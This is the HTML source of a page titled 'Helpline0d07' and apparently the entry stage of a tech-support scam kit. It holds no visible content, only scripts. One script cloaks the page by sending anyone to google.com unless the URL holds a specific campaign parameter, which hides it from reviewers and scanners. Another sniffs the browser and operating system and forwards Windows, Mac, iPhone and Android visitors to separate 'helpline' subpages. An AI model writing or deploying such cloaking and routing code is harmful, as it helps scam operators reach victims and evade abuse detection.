<html xmlns="http:/www.w3.org/1999/xhtml">
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><meta name="robots" content="noindex,nofollow">
	<title>Helpline0d07</title>
<script>
    class PageGuard {
        constructor(key, value, url) {
            this.expectedKey = key;
            this.expectedValue = value;
            this.redirectUrl = url;
        }

        getExpectedKey() {
            return this.expectedKey;
        }

        getExpectedValue() {
            return this.expectedValue;
        }

        setRedirectUrl(url) {
            this.redirectUrl = url;
        }

        isParameterSet() {
            const params = new URLSearchParams(window.location.search);
            return params.has(this.expectedKey);
        }

        getParameterValue() {
            const params = new URLSearchParams(window.location.search);
            return params.get(this.expectedKey);
        }

        isValueCorrect() {
            const value = this.getParameterValue();
            return value === this.expectedValue;
        }

        redirectTo() {
            window.location.href = this.redirectUrl;
        }

        validate() {
            if (!this.isParameterSet() || !this.isValueCorrect()) {
                this.redirectTo();
            }
        }

        run() {
            this.validate();
            console.log("Validation Passed!");
        }
    }

    const guard = new PageGuard('camp', '125225', 'https://www.google.com/');
    guard.run();
</script>
	<script type="text/javascript">
	var isChromium = window.chrome,
    vendorName = window.navigator.vendor,
    isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
    isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
	if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
   	// is Google chrome
	window.location.href = "./0WindbnSub08w0winin807/index.html";
	}
	if(navigator.userAgent.indexOf("Firefox") != -1 )
    {
         window.location.href = "./0WindbnSub08w0winin807/index.html";
    }
	if(window.navigator.userAgent.indexOf("Edge") != -1 )
    {
         window.location.href = "./0WindbnSub08w0winin807/index.html";
    }
	if(window.navigator.userAgent.indexOf("Mac") != -1 )
    {
         window.location.href = "./0MacdbnSubD7w0Macin87/index.html";
    }

		if(window.navigator.userAgent.indexOf("iPhone") != -1 )
					{
							 window.location.href = "./iOShelpline00SubD087/index.html";
					}


					if(window.navigator.userAgent.indexOf("Android") != -1 )
								{
										 window.location.href = "./AndroidHelpline00SubD87/index.html";
								}

	if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
    {
      window.location.href = "./0WindbnSub08w0winin807/index.html";
    }
	$SAFARI_URL = "apple";
</script>


</body>


</html>
